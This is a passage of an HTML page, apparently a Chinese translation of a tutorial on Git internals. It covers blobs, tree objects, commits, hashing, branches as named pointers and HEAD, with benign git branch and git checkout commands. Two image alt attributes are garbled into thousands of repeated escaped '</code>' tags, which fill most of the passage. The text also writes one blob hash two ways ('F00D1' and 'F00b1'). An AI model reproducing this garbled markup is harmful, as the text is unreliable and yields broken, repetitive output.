src="https://camo.githubusercontent.com/803ffa1082a137a3314e90c042c4dcbd5c3abde1b8f3e69aaacdeeba822164a6/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33382e706e67" alt="改变 blob 会得到新的 SHA-1 值"></p><p>由于我们得到了一个新的哈希值，所以对应 <strong>树对象</strong> 的目录也会改变。毕竟，我们的 <strong>树对象</strong> 不再指向 <strong>blob 73D8A</strong> 了，而是指向了 <strong>blob 62E7A</strong>。当我们改变 <strong>树对象</strong> 的内容时，我们也改变了它的哈希值。</p><p><img src="https://camo.githubusercontent.com/b80e5342dd3871c8e8db1af02160ff7ba1a509d8d3f1e5b30e951f1530709dc0/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33392e706e67" alt="blob 变了，指向它的树对象也需要变"></p><p>现在，由于原来那个 <strong>树对象</strong> 的哈希值已经不同了，我们也需要改变它的 <strong>父树对象</strong>——后者不再指向 <strong>tree CAFE7</strong>了，而是指向了 <strong>tree 246001</strong>。最终，<strong>父树对象</strong> 也会有一个新的哈希值。</p><p><img src="https://camo.githubusercontent.com/43ae3b3c1d2930600f6e1eb8ce0a175700bb23f1a2941351b42dbb63f6f41a3f/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34302e706e67" alt="根节点也变了，它的哈希值也变了"></p><p>几乎做好创建一个新 <strong>提交</strong> 对象的准备了，我们好像会再一次保存很多的数据——整个文件系统。但是真的有必要这么做吗？</p><p>实际上，一些对象（尤其是 <strong>blob</strong> 对象）相比起之前的提交来说没有任何改变——<strong>blob F92A0</strong>仍然原封不动，<strong>blob F00D1</strong> 也一样。</p><p>这就是其中的秘诀——只有对象改变了，我们才再次保存它。在这个例子中，我们不需要再次保存 <strong>blob F92A0</strong> 和 <strong>blob F00b1</strong>。我们只需要通过它们的哈希值引用它们，然后我们可以创建 <strong>提交</strong> 对象。</p><p><img src="https://camo.githubusercontent.com/e586eff3853acfe86cf448c8d0aeff9f5d6f4a3a6ae4f5b180a6ed01f381b61e/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34312e706e67" alt="那些没有丝毫变化的 blob 是通过它们的哈希值被引用的"></p><p>由于这次 <strong>提交</strong> 不是第一次 <strong>提交</strong>，所以它有一个父节点——<strong>commit A1337</strong>。</p><h4 id="回顾一下，我们介绍了三种-git-对象："><a href="#回顾一下，我们介绍了三种-git-对象：" class="headerlink" title="回顾一下，我们介绍了三种 git 对象："></a>回顾一下，我们介绍了三种 git 对象：</h4><ul><li><strong>blob</strong>——文件的内容。</li><li><strong>树对象</strong>——一个（由 <strong>blob</strong> 和 <strong>树对象</strong> 组成的）目录列表。</li><li><strong>提交对象</strong>——工作树的一个快照。</li></ul><p>让我们思考一下这些对象的哈希值吧。如果我写了 <code>git is awesome!</code> 并从它创建了一个 <strong>blob</strong>。你也在自己的系统上这么做，我们会有相同的哈希值吗？</p><p>答案是肯定的。因为这两个 <strong>blob</strong> 有相同的内容，自然也会有相同的 SHA-1 哈希值。</p><p>如果我创建了一个引用 <code>git is awesome!</code> 这个 <strong>blob</strong> 的 <strong>树对象</strong> ，赋给它一个特定的名字和元数据，你也在自己的系统上重复我的操作。我们会有相同的哈希值吗？</p><p>答案还是肯定的。因为这两个 <strong>树对象</strong> 是相同的，它们会有同样的哈希值。</p><p>如果我创建了一个指向那个 <strong>树对象</strong> 的 <strong>提交对象</strong>，提交信息为 <code>Hello</code>，你也在自己的系统上重复了一遍这个操作，结果会怎样呢？我们的哈希值还会相同吗？</p><p>这个时候的答案是否定的。即使我们的 <strong>提交对象</strong> 指向了相同的 <strong>树对象</strong>，它们也会有不同的 <strong>提交详情</strong>——时间、提交者，等等。</p><h1 id="Git-中的分支"><a href="#Git-中的分支" class="headerlink" title="Git 中的分支"></a>Git 中的分支</h1><p><strong>分支（branch）只不过是提交对象的命名引用</strong>。</p><blockquote><p>译者注：分支引用的是 <strong>提交对象</strong>，为了简单起见，下文在谈分支时，有时候会将 <strong>提交对象</strong> 简称为 <strong>提交</strong>。</p></blockquote><p>我们可以一直用 SHA-1 哈希值引用一个 <strong>提交</strong>，但是人们通常喜欢以其他形式命名对象。<strong>分支</strong> 恰好是引用 <strong>提交</strong> 的一种方式，实际上也只是这样。</p><p>在大多数仓库中，主线开发都是在一个叫做 <code>master</code> 的分支上完成的。<code>master</code> 只是一个名字，它是在我们使用 <code>git init</code> 命令的时候被创建的。正因为如此，它被广泛使用。然而，它并不特别，我们可以用任何我们喜欢的名字代替它。</p><p>通常，分支指向的是当前开发线上的最近一次 <strong>提交</strong>。</p><p><img src="https://camo.githubusercontent.com/efa001a19d15c01a1eced1ceb1d581b9eb5f20f78a726fa922d1b125c0a9955a/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34322e706e67" alt="分支只不过提交的命名引用"></p><p>我们通常使用 <code>git branch</code> 命令创建一个新分支，而我们实际创建的却是另一个指针（pointer）。假设我们使用 <code>git branch test</code> 命令创建了一个名为 <code>test</code> 的分支，我们实际上是创建了另一个指针，它指向当前分支上的同一 <strong>提交</strong>。</p><p><img src="https://camo.githubusercontent.com/cd47885461841a143014b3eef8697e32d9de2eb97e26bd56b22db7d49103e43d/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34332e706e67" alt="使用 git branch&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt; 创建另一个指针"></p><p><code>git</code> 是怎么知道我们当前所在的分支呢？答案是它维护了一个名为 <code>HEAD</code> 的特殊指针。通常情况下，<code>HEAD</code> 会指向一个分支，这个分支指向一个 <strong>提交</strong>。有时候，<code>HEAD</code> 也能直接指向一个 <strong>提交</strong>，不过这不是我们的重点。</p><p><img src="https://camo.githubusercontent.com/f0dcc32c65098ca48c7974af49466103d2e49622110a4097021dcfcbd4b9ce97/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34342e706e67" alt="HEAD 指向我们当前所在的分支"></p><blockquote><p>译者注：活动分支（active branch）指的是我们当前所在的分支，也就是 <code>HEAD</code> 指向的分支。</p></blockquote><p>要将活动分支切换到 <code>test</code>，我们可以使用命令 <code>git checkout test</code>。现在我们已经能猜到这条命令真正做的事情了——它只不过是把 <code>HEAD</code> 指向的分支改成了 <code>test</code>。</p><p><img src="https://camo.githubusercontent.com/5c0cda513d9f2961c3d2e6f7c0b5b9294f4db8fe93a02c24264722ea0f2e5456/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34352e706e67" alt="git checkout test&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt; 改变 HEAD&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/